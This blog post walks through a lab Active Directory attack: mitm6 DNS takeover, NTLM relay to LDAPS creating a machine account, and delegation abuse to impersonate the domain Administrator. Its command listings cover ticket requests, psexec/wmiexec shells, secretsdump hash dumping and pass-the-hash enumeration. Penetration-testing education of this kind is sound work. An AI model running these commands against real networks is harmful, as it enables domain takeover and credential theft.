---
title: "Red teaming Local Domain Admin Impersonation"
date: 2024-02-15 00:00:00 +0000
categories: 
  - Redteam 
  - Active Directory
---

## INTRODUCTION

This paper will discuss methods that penetration testers can employ to gain initial access to target networks and compromise the entire domain without relying on third-party applications or reusing plaintext credentials. We'll explore how a default Windows environment behaves when IPv6 is enabled, allowing us to execute a DNS takeover using MITM6 and relay credentials to LDAP servers secured with LDAP Over TLS using Impacket's Ntlmrelayx tool to establish new machine accounts. Leveraging these newly created machine accounts, we'll authenticate to LDAP and modify properties, granting us access to the target machine while impersonating various users, including Domain Admins. This approach relies on resource-based constrained delegation, and we'll provide a comprehensive walkthrough.

To achieve full network compromise, we'll exploit the SpoolService bug (also known as PrinterBug) to trigger authentication from the Domain Controller to a host we control, leveraging Unconstrained Delegation. By employing this technique, we can extract the krbtgt ticket and use it to extract data from the Domain Controller database.

## WHAT IS RESOURCE-BASED AND UNCONSTRAINED DELEGATIONS?

Resource-based delegation and unconstrained delegation are both mechanisms within Windows Active Directory that govern how authentication and authorization are handled.

1. **Resource-based delegation**: This is a more secure form of delegation where permissions are granted to specific resources, such as a computer or a service. It allows a service running on one computer to access resources on another computer on behalf of a user. In resource-based delegation, permissions are explicitly configured for the service account to act on behalf of a user, typically using Kerberos protocol. This delegation is more granular and controlled, limiting the scope of access and reducing the risk of privilege escalation.
    
2. **Unconstrained delegation**: In contrast, unconstrained delegation is a less secure form of delegation where a service running under a domain account can impersonate any user and request resources on their behalf without limitations. This means that the service has the ability to authenticate to other services as any user in the domain without their knowledge or consent. Unconstrained delegation poses significant security risks, as it can potentially lead to unauthorized access and privilege escalation if exploited by an attacker.
    

In summary, resource-based delegation offers more control and security by limiting access to specific resources, while unconstrained delegation provides broader access but also increases the risk of misuse and exploitation. It's important for administrators to carefully consider the security implications of each delegation type and implement the appropriate controls based on their organization's security requirements.

## WHAT IS SPN?

An SPN, or Service Principal Name, is a unique identifier for a service instance in a Windows domain. It is used by the Kerberos authentication protocol to associate a service instance with a service logon account. SPNs are crucial for the authentication process in a Windows environment, particularly in situations where services need to authenticate to other services or systems.

Here are some key points about SPNs:

1. **Unique Identifier**: An SPN is a unique identifier for a particular service, typically in the format `service_class/host:port/service_name`, where:
    
    - `service_class` specifies the general class of service (e.g., HTTP, SQL, LDAP).
    - `host:port` specifies the network location of the service.
    - `service_name` specifies the specific service instance.
2. **Associated with Service Accounts**: Each SPN is associated with a service logon account (usually a domain account) that represents the service. When a client needs to authenticate to a service, it looks up the appropriate SPN associated with that service to initiate the authentication process.
    
3. **Used in Kerberos Authentication**: SPNs play a crucial role in the Kerberos authentication process. When a client needs to authenticate to a service, it requests a Kerberos ticket from the Key Distribution Center (KDC) using the SPN of the service. The KDC then authenticates the client and issues a ticket granting ticket (TGT) and a service ticket (TGS) that the client can use to authenticate to the service.
    
4. **Registration and Maintenance**: SPNs must be registered in Active Directory to be used for Kerberos authentication. This registration process can be automatic (for certain services like Active Directory domain controllers) or manual (for custom services). Proper maintenance of SPNs, including ensuring uniqueness and accuracy, is essential for reliable Kerberos authentication.
    

In summary, an SPN is a unique identifier for a service instance in a Windows domain, used for Kerberos authentication. It helps clients locate and authenticate to services securely, making it a fundamental component of the Windows authentication infrastructure.

## WINDOWS IPV6 AND WPAD

1. **Windows IPv6**:
    
    - IPv6 is the latest version of the Internet Protocol, designed to replace IPv4 due to the exhaustion of IPv4 addresses.
    - In Windows environments, IPv6 is enabled by default alongside IPv4. It provides several advantages over IPv4, including a larger address space, improved security features, and better support for modern networking technologies.
    - Windows operating systems use IPv6 to communicate over IPv6-enabled networks. This includes features such as automatic address configuration (through stateless address autoconfiguration or DHCPv6), neighbor discovery, and routing protocols like IPv6 routing protocols.
2. **WPAD (Web Proxy Auto-Discovery Protocol)**:
    
    - WPAD is a protocol used to automatically configure web proxy settings for client devices on a network.
    - It allows client devices to automatically discover the appropriate web proxy server without manual configuration.
    - WPAD typically operates by publishing a WPAD configuration file (usually named `wpad.dat`) on a web server within the network. Clients then automatically retrieve and use this file to configure their web proxy settings.
    - WPAD can be particularly useful in corporate environments where proxy servers are commonly used to control and monitor internet access.


## What is required to execute this attack

	1 - First, we must be within the network
	2 - We must know the domain name
	3 - Tools : netexec or crackmapexec,nmap , mitm6 , ntlmrelayx, geTst.py , psexec.py or wmiexec ,if you need dump hash you can use secretsdump

    
#### Disclaimer

I will be attacking the environment consisting of Windows 10 and Windows Server 2016.


## Attack DEMO

This scan is to determine the domain name and the alive machines.

```bash
netexec smb 192.168.56.100-254
```

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-1.png)](http://127.0.0.1:4000/)
Nice we get two machine alive first DC and Second WS02 and we get domain name `cbank.local`

Also since we are creating new machine account we need to check if the LDAP over TLS (LDAPS) is configure, to do so we will use Nmap to scan the DC for port(636):

```bash
sudo nmap 192.168.56.100  -p636  -Pn
```

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-2.png)](http://127.0.0.1:4000/)
Now that we have met all the necessary conditions for the attack, we will proceed to execute it using both the MITM6 framework and Impacket ntlmrelayx. This will allow us to relay captured credentials to LDAPS and create a new machine account using the obtained credentials. To ensure the success of the attack, it's essential to whitelist specific targets, particularly those whose machines are expected to be rebooted (client machines), while our MITM6 server is active. This will redirect traffic from the targets to our rogue DNS server. To simplify the process, I have whitelisted WS02 and will initiate the reboot from that machine in my environment.

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-3.png)](http://127.0.0.1:4000/)
And execute ntlmrelayx targeting LDAPS on the DC as follow:

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-4.png)](http://127.0.0.1:4000/)
If everything goes as expected, we will observe that ntlmrelayx starts capturing credential data and attempts to attack LDAPS on the domain controller.

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-5.png)](http://127.0.0.1:4000/)

Once ntlmrelayx successfully authenticates to LDAPS using the relayed credentials, it will proceed to attempt the creation of a new machine account using these credentials. It will also modify the "msDS-AllowedToActOnBehalfOtherIdentity" file on the computer named Mark to allow the newly created machine to impersonate any user.

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-6.png)](http://127.0.0.1:4000/)
```bash
Adding new computer with username: JHEDTLNY$ and password: B!y#d,<eQG,5kze result: OK

```
we will use the Impacket script getST.py to request a service ticket to access impersonate WS02's privileges as the domain administrator (cbank\Administrator).

```bash
impacket-getST  -spn cifs/ws02.cbank.local cbank.local/JHEDTLNY\$:'B!y#d,<eQG,5kze' -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -no-pass -k WS02.cbank.local
impacket-psexec -no-pass -k WS02.cbank.local 

```


[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-7.png)](http://127.0.0.1:4000/)

We can use the Kerberos service ticket with Impackt SecretsDump to dump local hashes

```bash
impacket-secretsdump -no-pass -k WS02.cbank.local

```

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-8.png)](http://127.0.0.1:4000/)
 We can use the WS02 to  enumeration 

```bash
netexec smb 192.168.56.100 -u WS02$ -H aad3b435b51404eeaad3b435b51404ee:0fd304d236c226b007307984f7c6f766 --shares
```

[![Image Alt Text](/assets/img/posts/Redteam/2024-02-15-9.png)](http://127.0.0.1:4000/)

# References


	 1- https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview
	 2- https://chryzsh.github.io/relaying-delegation/
	 3- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
	 4- https://www.youtube.com/watch?v=Zb-Fp62N2y8&t=2503s (arabic)

We have reached the  end of the article.